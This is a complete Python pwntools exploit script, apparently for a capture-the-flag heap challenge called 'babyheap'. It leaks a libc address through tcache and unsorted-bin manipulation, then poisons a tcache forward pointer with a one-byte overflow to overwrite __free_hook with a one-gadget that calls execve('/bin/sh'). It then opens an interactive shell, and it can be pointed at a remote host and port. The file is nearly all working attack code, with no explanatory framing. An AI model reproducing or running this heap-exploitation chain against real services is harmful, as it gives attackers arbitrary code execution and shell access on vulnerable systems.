#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
import os

r = None
#e = ELF('./babyheap')
libc = None

#gdb_script = '''break *(0x13cc+0x555555554000)
#c'''
#gdb_script = '''
#set breakpoint pending on
#break *0x7ffff7a442c5
#c'''
gdb_script=''

small = 0xf8
large = 0x178

leak_offset = 0x3dac00
#free_hook_offset = 0x3dc8a8

# One Gadgets -- remote libc
#0xe237f execve("/bin/sh", rcx, [rbp-0x70])
#constraints:
#  [rcx] == NULL || rcx == NULL
#  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
#
#0xe2383 execve("/bin/sh", rcx, rdx)
#constraints:
#  [rcx] == NULL || rcx == NULL
#  [rdx] == NULL || rdx == NULL
#
#0xe2386 execve("/bin/sh", rsi, rdx)
#constraints:
#  [rsi] == NULL || rsi == NULL
#  [rdx] == NULL || rdx == NULL
#
#0x106ef8 execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL
one_gadget = 0xe237f


# One gadgets -- local libc
#0x47c46	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  rax == NULL
#
#0x47c9a	execve("/bin/sh", rsp+0x30, environ)
#constraints:
#  [rsp+0x30] == NULL
#
#0xfccde	execve("/bin/sh", rsp+0x40, environ)
#constraints:
#  [rsp+0x40] == NULL
#
#0xfdb8e	execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL
one_gadget = 0xfccde

context.log_level = 'DEBUG'

def malloc(size, content='a', newline=True):
    r.sendline('M')
    r.recvuntil('>')
    r.sendline(str(size))
    r.recvuntil('>')
    if newline:
        r.sendline(content)
    else:
        r.send(content)
    r.recvuntil('>')

def free(idx):
    r.sendline('F')
    r.recvuntil('>')
    r.sendline(str(idx))
    r.recvuntil('>')


def show(idx):
    r.sendline('S')
    r.recvuntil('>')
    r.sendline(str(idx))
    return r.recvuntil('>')

def main():
    global r
    r.recvuntil('>')

    # Phase 1: Leak a libc address

    # Maximum number of items that can be in a 7cache is 7, so fill that up and add one more
    for i in xrange(8):
        malloc(large)
    malloc(large) # <- This last malloc will go into unsorted bin with a fwd ptr to the heap arena (in libc)

    for i in xrange(8):
        free(i)
    free(8) # <- this last free will put the arena address into the first 4 bytes

    for i in xrange(8):
        malloc(large)

    leak = int('0x' + show(7).split('\x0a')[0][2:].rjust(6, '\x00')[::-1].encode('hex'),16)
    print "[*] Leaked address:" + hex(leak)
    libc.address = leak-leak_offset
    print "[*] Libc base is at address:" + hex(libc.address)

    free(7)

    # Phase 2: Get an allocation at an address of our choosing

    # Step 1
    #malloc(large) # idx 0: A
    malloc(large) # idx 7: A
    #malloc(small) # idx 1: B
    malloc(small) # idx 8: B

    # Step 2
    #free(0)
    free(7)
    #free(1)
    free(8)

    # Step 3
    #malloc(small) # idx 0: B
    malloc(small) # idx 7: B
    #malloc(large,cyclic(large) + '\x81', newline=True) # idx 1: A
    malloc(large,cyclic(large) + '\x81', newline=True) # idx 8: A
    #malloc(small) # idx 2: C
    malloc(small) # idx 9: C
    #malloc(small) # idx 3: D
    #malloc(small) # idx 3: D

    # Step 5
#    free(0) # Free B into large tcache
    free(7) # Free B into large tcache
#    free(2) # Free C into small tcache
    free(9) # Free C into small tcache

    # Step 6
    #malloc(large, cyclic(256) + p64(0xdeadbeefcafebabe)) # idx 0: B <- overwrites FW ptr in C
    #target = p64(0xdeadbeefcafebabe)
    #target = p64(libc.symbols['__free_hook'])
    #target = p64(libc.address + free_hook_offset)
    target = p64(libc.symbols['__free_hook'])
    malloc(large, cyclic(256) + target[:-1], newline=False) # idx 0: B <- overwrites FW ptr in C
    # malloc(small, '\x00')
    malloc(small, target[0])  # Need to adjust this so last byte is address that we want
    free(0) # make sure we don't go over 10 max allocations

    malloc(small, p64(libc.address + one_gadget)[:-1], newline=False) # <- overwrite __free_hook with one gadget

    r.interactive()

if __name__ == "__main__":
    global r, libc
    if len(sys.argv) == 1:
        libc = ELF('./local_libc.so.6')
        cwd = os.getcwd()
        #r = process('./babyheap', env = {'LD_PRELOAD': cwd + '/ld-2.29.so ' + cwd + '/libc.so'})
        #r = gdb.debug('./babyheap', env = {'LD_PRELOAD': cwd + '/ld-2.29.so ' + cwd + '/libc.so'})
        #r = gdb.debug('./babyheap', gdbscript=gdb_script)
        r = process('./babyheap')
    elif len(sys.argv) == 3:
        libc = ELF('./libc.so')
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        print "Usage: %s ip port" % sys.argv[0]

    main()

